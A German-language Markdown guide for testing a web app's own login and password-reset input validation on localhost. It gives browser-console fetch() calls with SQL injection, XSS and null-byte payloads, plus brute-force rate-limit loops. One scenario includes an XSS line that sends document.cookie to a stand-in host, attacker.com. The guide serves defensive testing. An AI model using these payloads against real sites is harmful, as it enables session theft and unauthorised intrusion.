# Security Testing Guide - Input Validation

Dieses Dokument zeigt dir, wie du die Input Validation deiner App live testen kannst.

## Quick Start

1. Öffne deine App auf http://localhost:3000/login
2. Öffne die Browser DevTools (F12 oder Rechtsklick → Inspect)
3. Gehe zum "Console" Tab
4. Kopiere einen Test-Case unten und führe ihn aus

## Test Cases - Email Validation

### Test 1: SQL Injection im Email-Feld
```javascript
// Versuche: SQL Injection
fetch('/api/auth/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    email: "admin'--",
    password: 'Test123'
  })
}).then(r => r.json()).then(console.log)

// Erwartetes Ergebnis:
// 400 Validierungsfehler: email: Ungültige E-Mail-Adresse
```

### Test 2: XSS Injection im Email-Feld
```javascript
// Versuche: XSS mit Script-Tag
fetch('/api/auth/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    email: "<script>alert('xss')</script>@example.com",
    password: 'Test123'
  })
}).then(r => r.json()).then(console.log)

// Erwartetes Ergebnis:
// 400 Validierungsfehler: email: Ungültige E-Mail-Adresse
```

### Test 3: JavaScript Protocol Injection
```javascript
// Versuche: javascript: protocol
fetch('/api/auth/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    email: "javascript:alert('xss')",
    password: 'Test123'
  })
}).then(r => r.json()).then(console.log)

// Erwartetes Ergebnis:
// 400 Validierungsfehler: email: Ungültige E-Mail-Adresse
```

### Test 4: Null Byte Injection
```javascript
// Versuche: Null-Byte
fetch('/api/auth/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    email: "test@example.com\x00admin",
    password: 'Test123'
  })
}).then(r => r.json()).then(console.log)

// Erwartetes Ergebnis:
// 401 Invalid login credentials (passt durch Validation)
```

### Test 5: Empty Email
```javascript
// Versuche: Leere E-Mail
fetch('/api/auth/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    email: "",
    password: 'Test123'
  })
}).then(r => r.json()).then(console.log)

// Erwartetes Ergebnis:
// 400 Validierungsfehler: email: E-Mail ist erforderlich
```

## Test Cases - Password Validation

### Test 6: SQL Injection im Password
```javascript
// Versuche: SQL Injection im Passwort
fetch('/api/auth/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    email: "test@example.com",
    password: "' OR '1'='1"
  })
}).then(r => r.json()).then(console.log)

// Erwartetes Ergebnis:
// 401 Invalid login credentials (passt durch Validation, scheitert bei Auth)
```

### Test 7: Very Long Password
```javascript
// Versuche: Buffer Overflow mit sehr langem Passwort
const longPassword = 'A'.repeat(100000);
fetch('/api/auth/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    email: "test@example.com",
    password: longPassword
  })
}).then(r => r.json()).then(console.log)

// Erwartetes Ergebnis:
// 401 Invalid login credentials (passt durch, aber wird abgelehnt)
```

### Test 8: Empty Password
```javascript
// Versuche: Leeres Passwort
fetch('/api/auth/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    email: "test@example.com",
    password: ""
  })
}).then(r => r.json()).then(console.log)

// Erwartetes Ergebnis:
// 400 Validierungsfehler: password: Passwort ist erforderlich
```

## Test Cases - Password Reset

### Test 9: XSS im Contact-Feld
```javascript
// Versuche: XSS im Password Reset
fetch('/api/auth/password-reset-request', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    contact: "<img src=x onerror=alert('xss')>",
    method: "email"
  })
}).then(r => r.json()).then(console.log)

// Erwartetes Ergebnis:
// 400 Validierungsfehler: contact: E-Mail oder Telefonnummer ist erforderlich
```

### Test 10: Invalid Method
```javascript
// Versuche: Ungültige Methode
fetch('/api/auth/password-reset-request', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    contact: "test@example.com",
    method: "backdoor" // Invalid!
  })
}).then(r => r.json()).then(console.log)

// Erwartetes Ergebnis:
// 400 Validierungsfehler: method: Methode muss "email" oder "phone" sein
```

## Test Cases - Rate Limiting

### Test 11: Rate Limit Triggering
```javascript
// Versuche: 11 schnelle Login-Versuche (sollte beim 11. blockiert werden)
for (let i = 1; i <= 12; i++) {
  const res = await fetch('/api/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      email: `test${i}@example.com`,
      password: 'Test123'
    })
  });
  const data = await res.json();
  console.log(`Versuch ${i}: ${res.status} - ${data?.statusMessage || data?.message}`);
  
  // Warte 500ms zwischen Versuchen
  await new Promise(resolve => setTimeout(resolve, 500));
}

// Erwartetes Ergebnis:
// Versuche 1-10: 401 Invalid login credentials
// Versuch 11+: 429 Zu viele Anmeldeversuche. Bitte versuchen Sie es in einigen Minuten erneut.
```

### Test 12: Countdown Timer (nach Rate Limit)
```javascript
// Nach Test 11, versuche sofort nochmal
fetch('/api/auth/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    email: "test@example.com",
    password: 'Test123'
  })
}).then(r => r.json()).then(console.log)

// Erwartetes Ergebnis:
// 429 Zu viele Anmeldeversuche. Bitte versuchen Sie es in einigen Minuten erneut.
// (Im Frontend sollte der Button deaktiviert sein mit Countdown)
```

## Expected Results Zusammenfassung

✅ **Validation erfolgreich, wenn:**
- Ungültige E-Mails abgelehnt werden (400)
- XSS-Injektionen blockiert werden (400)
- SQL-Injektionen nicht funktionieren (bei Auth failure)
- Leere Felder abgelehnt werden (400)
- Ungültige Methoden abgelehnt werden (400)
- Rate Limit greift nach 10 Versuchen (429)
- Nach Rate Limit bleibt User blockiert (429)

❌ **Sicherheitslücken, wenn:**
- XSS-Payload wird akzeptiert
- SQL-Injection-Syntax wird nicht validiert
- Rate Limit wird umgangen
- Sehr lange Inputs crashen den Server

## Hacker Attack Scenarios

### Scenario 1: Brute Force Attack
```javascript
// Hacker versucht, viele Passwörter zu testen
const passwords = ['123456', 'password', 'admin123', 'letmein', ...];
for (const pwd of passwords) {
  // Server sollte nach 10 Versuchen blockieren
}
```
**Ergebnis:** ✅ Rate Limiting blockiert nach 10 Versuchen

### Scenario 2: SQL Injection
```javascript
email: "admin'--"
// Versucht, Auth-Query zu manipulieren
```
**Ergebnis:** ✅ Email-Validation lehnt ungültige Formate ab

### Scenario 3: XSS via Form
```javascript
email: "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>"
// Versucht, JavaScript auszuführen
```
**Ergebnis:** ✅ Email-Validation lehnt ungültiges Format ab + Sanitization entfernt Tags

### Scenario 4: Null Byte Injection
```javascript
email: "test@example.com\x00"
// Alte Sicherheitslücke, moderne Apps sollten immun sein
```
**Ergebnis:** ✅ Passt durch Validation (Email ist valid), aber schadet nicht

## Weitere Sicherheits-Checks

### Check 1: Response gibt keine Hinweise auf Existenz von Accounts
```javascript
// Test mit nicht-existenter E-Mail
fetch('/api/auth/password-reset-request', {
  method: 'POST',
  body: JSON.stringify({
    contact: "nonexistent@fake.com",
    method: "email"
  })
}).then(r => r.json()).then(r => console.log(r))

// Sollte: "Falls ein Account mit diesen Angaben existiert..."
// NICHT: "User nicht gefunden"
```
**Ergebnis:** ✅ Generic Message (User Enumeration prevented)

### Check 2: HTTPS/SSL ist aktiv (in Production)
```javascript
// In der Browser Console in Production:
console.log(window.location.protocol)
// Sollte: "https:"
// NICHT: "http:"
```

## ADVANCED: Exponential Backoff Testing

### Test 13: Exponential Backoff nach mehreren Blockierungen
```javascript
// Dieser Test simuliert einen wiederholten Angreifer
// Mit Exponential Backoff wird die Wartezeit bei jedem Block länger

// 1. First run - 10 attempts, should block on attempt 11
for (let i = 1; i <= 12; i++) {
  const res = await fetch('/api/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      email: `test${i}@example.com`,
      password: 'Test123'
    })
  });
  const data = await res.json();
  console.log(`Versuch ${i}: ${res.status}`, res.status === 429 ? `(Wartezeit: ${data.retryAfter}s)` : '');
  await new Promise(resolve => setTimeout(resolve, 200));
}

// 2. Nach 1 Minute: Versuche es wieder
// Erwartet: Normaler 1min Backoff

// 3. Nach weiterer Blockade: Backoff verdoppelt sich auf 2min
// Der Konsole-Output zeigt: "backoff: 2x, 2min window"

// 4. Nach nächster Blockade: 5x = 5 Minuten
// Der Konsole-Output zeigt: "backoff: 5x, 5min window"

// Ergebnis: Mit jedem Block wird der Backoff exponentiell länger!
```

**Backoff Levels:**
- 1. Block: 1x (1 min)
- 2. Block: 2x (2 min)
- 3. Block: 5x (5 min)
- 4. Block: 15x (15 min)
- 5. Block: 60x (1 hour)
- 6+ Blocks: 240x (4 hours)

## Checkliste für dich

- [ ] Teste Test 1-5 für Email Validation
- [ ] Teste Test 6-8 für Password Validation
- [ ] Teste Test 9-10 für Reset Validation
- [ ] Teste Test 11-12 für Rate Limiting
- [ ] Teste Test 13 für Exponential Backoff
- [ ] Teste alle 4 Hacker Scenarios
- [ ] Führe alle Security Checks aus
- [ ] Dokumentiere deine Ergebnisse

## Ergebnisse dokumentieren

Wenn du einen Test machst, notiere:
- Test Case Nummer
- Input den du gesendet hast
- HTTP Status Code
- Response Message
- ✅ Sicher oder ❌ Sicherheitslücke

Beispiel:
```
Test 1: SQL Injection
Input: email: "admin'--"
Status: 400
Message: Validierungsfehler: email: Ungültige E-Mail-Adresse
Result: ✅ Sicher - XSS blockiert
```

## Fragen?

Wenn du Fragen zu einem Test hast oder etwas nicht funktioniert:
1. Stelle sicher, dass die App läuft (http://localhost:3000)
2. Stelle sicher, dass die DevTools Console offen ist
3. Kopiere den Test genau wie gezeigt
4. Schaue auf die Response

Good luck mit dem Security Testing! 🛡️

